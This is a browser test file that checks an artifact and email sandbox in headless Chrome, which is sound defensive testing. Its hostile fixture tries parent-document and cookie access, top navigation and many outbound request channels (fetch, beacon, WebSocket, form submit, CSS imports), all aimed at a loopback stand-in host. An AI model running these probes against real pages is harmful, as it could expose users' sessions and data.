/**
 * Real-browser proof for the artifact sandbox (P6 definition of done): a hostile artifact cannot
 * reach the parent origin or fetch any other host. Runs in a locally installed Chrome through
 * playwright-core (no browser download); skipped when no Chrome is found. Every "external host"
 * is a loopback server we control, so the test never touches the internet.
 */
import { existsSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { type Browser, chromium } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  ARTIFACT_SANDBOX,
  artifactHostHeaders,
  artifactHostPage,
  buildArtifactSrcdoc,
  HOST_RENDER,
} from "../src/core/artifact.ts";
import { sanitizeEmailHtml } from "../src/core/email.ts";

function findChrome(): string | undefined {
  const candidates = [
    process.env.CHROME_PATH,
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
    "/Applications/Chromium.app/Contents/MacOS/Chromium",
    "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
  ];
  return candidates.find((p): p is string => p !== undefined && p !== "" && existsSync(p));
}

const chrome = findChrome();

/** JSON that is safe inside an inline <script> (no "</script>" breakout). */
const js = (v: unknown) => JSON.stringify(v).replace(/</g, "\\u003c");

interface Srv {
  server: Server;
  origin: string;
  hits: string[];
}

async function serve(
  handler: (path: string, res: import("node:http").ServerResponse) => void,
): Promise<Srv> {
  const hits: string[] = [];
  const server = createServer((req, res) => {
    hits.push(req.url ?? "");
    handler(req.url ?? "/", res);
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const { port } = server.address() as AddressInfo;
  return { server, origin: `http://127.0.0.1:${port}`, hits };
}

/** Everything a hostile artifact might try. Results are posted to the parent for inspection. */
function hostileArtifact(ext: string): string {
  return `<h1 id="t">hostile</h1><div style="height:640px"></div>
<link rel="stylesheet" href="${ext}/css"><link rel="prefetch" href="${ext}/prefetch">
<img src="${ext}/img"><div style="background:url(${ext}/bg)">bg</div>
<style>@import url(${ext}/import); body{background-image:url(${ext}/body)}</style>
<script src="${ext}/script.js"></script>
<script>
(async function(){
  var r = {};
  function t(name, fn){ try { r[name] = String(fn()); } catch (e) { r[name] = "blocked:" + (e && e.name); } }
  t("parentDocument", function(){ return parent.document.title; });
  t("parentSecret", function(){ return parent.SECRET; });
  t("topLocation", function(){ return top.location.href; });
  t("cookie", function(){ return document.cookie; });
  t("localStorage", function(){ return localStorage.getItem("secret"); });
  t("origin", function(){ return self.origin; });
  t("open", function(){ return window.open("${ext}/popup"); });
  try { await fetch("${ext}/fetch"); r.fetch = "ok"; } catch (e) { r.fetch = "blocked"; }
  try { var x = new XMLHttpRequest(); x.open("GET", "${ext}/xhr", false); x.send(); r.xhr = "ok"; } catch (e) { r.xhr = "blocked"; }
  t("beacon", function(){ return navigator.sendBeacon("${ext}/beacon", "x"); });
  t("ws", function(){ return new WebSocket("${ext.replace("http", "ws")}/ws").readyState; });
  t("es", function(){ return new EventSource("${ext}/es").readyState; });
  t("worker", function(){ return new Worker("${ext}/worker.js"); });
  var i = new Image(); i.src = "${ext}/image-js"; document.body.appendChild(i);
  t("form", function(){ var f = document.createElement("form"); f.action = "${ext}/form"; f.method = "post"; document.body.appendChild(f); f.submit(); return "submitted"; });
  t("topNav", function(){ top.location = "${ext}/topnav"; return "navigated"; });
  setTimeout(function(){ parent.postMessage({ probe: r }, "*"); }, 300);
})();
</script>`;
}

const parentPage = (body: string) =>
  `<!doctype html><html><head><title>APP-SECRET-TITLE</title></head><body>
<script>window.SECRET="s3cret"; localStorage.setItem("secret","s3cret"); document.cookie="sid=s3cret; path=/";
window.messages=[]; addEventListener("message", function(e){ window.messages.push({ origin: e.origin, data: e.data, fromFrame: !!document.querySelector("iframe") && e.source === document.querySelector("iframe").contentWindow }); });
</script>${body}</body></html>`;

// On GitHub's macOS runners the tests pass but browser.close() hangs in afterAll (ci on main, 2026-10-19),
// so on macOS CI this real-browser proof is opt-in via PSYCHE_BROWSER_TESTS=1; Ubuntu CI and local
// Macs still run it whenever Chrome is installed.
const skipOnMacCi =
  process.platform === "darwin" &&
  process.env.CI !== undefined &&
  process.env.PSYCHE_BROWSER_TESTS !== "1";

describe.skipIf(chrome === undefined || skipOnMacCi)("artifact sandbox in Chrome", () => {
  let browser: Browser;
  let app: Srv;
  let ext: Srv;
  let host: Srv;
  const nonce = "n0nce1234";
  let appBody = "";

  beforeAll(async () => {
    ext = await serve((_p, res) => {
      res.writeHead(200, { "Content-Type": "text/plain", "Access-Control-Allow-Origin": "*" });
      res.end("ok");
    });
    app = await serve((_p, res) => {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(parentPage(appBody));
    });
    host = await serve((_p, res) => {
      res.writeHead(200, artifactHostHeaders(app.origin));
      res.end(artifactHostPage(app.origin, nonce));
    });
    browser = await chromium.launch({ executablePath: chrome, headless: true });
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    for (const s of [app, ext, host]) s?.server.close();
  });

  async function runInline(html: string, policy: { allowScripts: boolean }) {
    const built = buildArtifactSrcdoc(html, policy);
    appBody = `<iframe id="f" sandbox="${ARTIFACT_SANDBOX}" style="width:600px;height:200px"></iframe>
<script>document.getElementById("f").srcdoc=${js(built.srcdoc)};</script>`;
    const page = await browser.newPage();
    await page.goto(`${app.origin}/`);
    await page.waitForFunction(
      () =>
        (
          window as unknown as { messages: { data: { probe?: unknown; type?: string } }[] }
        ).messages.some((m) => m.data?.probe !== undefined || m.data?.type === "ready"),
      undefined,
      { timeout: 10_000 },
    );
    await page.waitForTimeout(800);
    const messages = (await page.evaluate("window.messages")) as {
      origin: string;
      fromFrame: boolean;
      data: Record<string, unknown>;
    }[];
    await page.close();
    return { messages, channel: built.channel };
  }

  it("blocks every network path and all parent access (inline srcdoc)", async () => {
    ext.hits.length = 0;
    const { messages, channel } = await runInline(hostileArtifact(ext.origin), {
      allowScripts: true,
    });
    const probe = messages.find((m) => m.data.probe !== undefined)?.data.probe as Record<
      string,
      string
    >;
    expect(probe).toBeDefined();
    expect(probe.parentDocument).toMatch(/^blocked:SecurityError/);
    expect(probe.parentSecret).toMatch(/^(blocked:SecurityError|undefined)$/);
    expect(probe.topLocation).toMatch(/^blocked:SecurityError/);
    expect(probe.cookie).toMatch(/^blocked/);
    expect(probe.localStorage).toMatch(/^blocked/);
    expect(probe.origin).toBe("null");
    expect(probe.open).toBe("null");
    expect(probe.fetch).toBe("blocked");
    expect(probe.xhr).toBe("blocked");
    expect(probe.topNav).toMatch(/^blocked/);
    // The decisive check: the "external" host saw nothing at all.
    expect(ext.hits).toEqual([]);
    // The bridge still works: messages arrive from the frame with an opaque origin.
    const resize = messages.find((m) => m.data.type === "resize");
    expect(resize).toMatchObject({ origin: "null", fromFrame: true });
    expect(resize?.data.channel).toBe(channel);
    const heights = messages
      .filter((m) => m.data.type === "resize")
      .map((m) => Number(m.data.height));
    expect(Math.max(...heights)).toBeGreaterThan(600);
  }, 60_000);

  it("runs no script at all in email mode, even inline handlers", async () => {
    ext.hits.length = 0;
    const html = `<img src="x" onerror="parent.postMessage({probe:{ran:'handler'}},'*')"><p>hi</p>`;
    const { messages } = await runInline(html, { allowScripts: false });
    expect(messages.some((m) => m.data.probe !== undefined)).toBe(false);
    expect(messages.some((m) => m.data.type === "resize")).toBe(true);
  }, 60_000);

  it("renders a sanitized hostile email without any request leaving", async () => {
    ext.hits.length = 0;
    const { JSDOM } = await import("jsdom");
    const dirty = `<p>Hi</p><img src="${ext.origin}/pixel.gif"><div style="background:url(${ext.origin}/bg)">x</div><script>fetch("${ext.origin}/s")</script>`;
    const clean = sanitizeEmailHtml(dirty, { window: new JSDOM("").window as unknown as Window });
    await runInline(clean.html, { allowScripts: false });
    expect(ext.hits).toEqual([]);
  }, 60_000);

  it("isolates the hosted placement on its own origin and relays only to the app", async () => {
    ext.hits.length = 0;
    const built = buildArtifactSrcdoc(hostileArtifact(ext.origin), { allowScripts: true });
    appBody = `<iframe id="f" src="${host.origin}/frame" sandbox="allow-scripts allow-same-origin" style="width:600px;height:300px"></iframe>
<script>addEventListener("message", function(e){ if (e.origin === ${JSON.stringify(host.origin)} && e.data && e.data.type === "host-ready") {
  document.getElementById("f").contentWindow.postMessage({ type: ${JSON.stringify(HOST_RENDER)}, channel: ${JSON.stringify(built.channel)}, srcdoc: ${js(built.srcdoc)} }, ${JSON.stringify(host.origin)});
}});</script>`;
    const page = await browser.newPage();
    await page.goto(`${app.origin}/`);
    await page.waitForFunction(
      () =>
        (window as unknown as { messages: { data: { type?: string } }[] }).messages.some(
          (m) => m.data?.type === "resize",
        ),
      undefined,
      { timeout: 10_000 },
    );
    await page.waitForTimeout(800);
    const messages = (await page.evaluate("window.messages")) as {
      origin: string;
      data: Record<string, unknown>;
    }[];
    await page.close();
    const relayed = messages.filter((m) => m.data.type === "resize");
    expect(relayed.length).toBeGreaterThan(0);
    expect(relayed.every((m) => m.origin === host.origin && m.data.channel === built.channel)).toBe(
      true,
    );
    // The probe's own postMessage to its parent lands on the host page, which drops it.
    expect(messages.some((m) => m.data.probe !== undefined)).toBe(false);
    expect(ext.hits).toEqual([]);
  }, 60_000);

  it("documents the residual: self-navigation leaves, but fires a second load the frame host sees", async () => {
    ext.hits.length = 0;
    const built = buildArtifactSrcdoc(
      `<script>setTimeout(function(){ location.href = "${ext.origin}/selfnav"; }, 50)</script>`,
      { allowScripts: true },
    );
    appBody = `<iframe id="f" sandbox="${ARTIFACT_SANDBOX}"></iframe>
<script>window.loads=0; var f=document.getElementById("f"); f.addEventListener("load", function(){ window.loads++; }); f.srcdoc=${js(built.srcdoc)};</script>`;
    const page = await browser.newPage();
    await page.goto(`${app.origin}/`);
    await page.waitForFunction(
      () => (window as unknown as { loads: number }).loads >= 2,
      undefined,
      { timeout: 10_000 },
    );
    await page.close();
    // ArtifactFrame tears the frame down on the second load; the desktop shell must also cancel
    // subframe navigations (Electron will-frame-navigate) so the request never leaves.
    expect(ext.hits).toContain("/selfnav");
  }, 60_000);

  it("refuses to be framed by any origin other than the app", async () => {
    appBody = "";
    const page = await browser.newPage();
    // ext pretends to be an attacker page framing the host.
    await page.goto(`${ext.origin}/`);
    await page.setContent(`<iframe id="f" src="${host.origin}/frame"></iframe>`);
    await page.waitForTimeout(800);
    const frames = page.frames().filter((f) => f.url().startsWith(host.origin));
    const loaded =
      frames.length > 0
        ? await frames[0]?.evaluate(() => document.body !== null).catch(() => false)
        : false;
    await page.close();
    expect(loaded).toBe(false);
  }, 60_000);
});
